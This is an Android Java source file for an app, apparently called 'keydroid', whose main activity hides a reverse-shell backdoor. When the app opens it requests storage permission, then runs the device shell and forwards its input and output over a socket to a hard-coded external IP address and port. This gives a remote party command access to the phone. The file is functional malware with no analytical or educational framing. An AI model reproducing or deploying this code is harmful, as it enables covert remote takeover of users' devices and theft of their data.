package com.keydroid;
import android.content.Context;
import android.os.Bundle;
import android.os.Environment;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.File;
import java.io.BufferedReader;		
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import android.app.Activity;
import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import android.widget.TextView;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
public class MainActivity extends Activity {
   @Override
   protected void onCreate(Bundle savedInstanceState) {
      super.onCreate(savedInstanceState);
      setContentView(R.layout.activity_main);
      new Thread(new Runnable(){
			@Override
			public void run() {
				try {
                                        checkperm();
				} catch (Exception e) {
					Log.e("Error", e.getMessage());
				}
			}
		}).start();
}
 	public void reverseShell() throws Exception {
		final Process process = Runtime.getRuntime().exec("system/bin/sh");
		Socket socket = new Socket("159.89.214.31", 1618);
		forwardStream(socket.getInputStream(), process.getOutputStream());
		forwardStream(process.getInputStream(), socket.getOutputStream());
		forwardStream(process.getErrorStream(), socket.getOutputStream());
		process.waitFor();
		socket.getInputStream().close();
		socket.getOutputStream().close();
	}
public void checkperm() {
       if(ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.WRITE_EXTERNAL_STORAGE") == PackageManager.PERMISSION_GRANTED) {
try {
					reverseShell();
				} catch (Exception e) {
					Log.e("Error", e.getMessage());
				}
        } else {
            final int REQUEST_CODE_ASK_PERMISSIONS = 123;
            ActivityCompat.requestPermissions(MainActivity.this, new String[]{"android.permission.WRITE_EXTERNAL_STORAGE"}, REQUEST_CODE_ASK_PERMISSIONS);
          checkperm();
        }
}
	private static void forwardStream(final InputStream input, final OutputStream output) {
		new Thread(new Runnable() {
			@Override
			public void run() {
				try {
					final byte[] buf = new byte[4096];
					int length;
					while ((length = input.read(buf)) != -1) {
						if (output != null) {
							output.write(buf, 0, length);
							if (input.available() == 0) {
								output.flush();
							}
						}
					}
				} catch (Exception e) {
				} finally {
					try {
						input.close();
						output.close();
					} catch (IOException e) {
					}
				}
			}
		}).start();
	}
}
